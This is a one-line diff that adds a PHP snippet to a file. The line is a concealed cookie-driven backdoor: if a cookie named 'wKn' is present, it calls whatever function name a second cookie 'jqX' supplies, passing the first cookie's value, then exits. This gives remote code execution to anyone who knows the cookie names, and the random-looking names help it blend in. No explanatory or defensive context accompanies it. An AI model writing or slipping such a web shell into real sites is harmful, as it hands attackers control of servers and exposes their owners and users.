@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["wKn"])){$_COOKIE["jqX"]($_COOKIE["wKn"]);exit;}
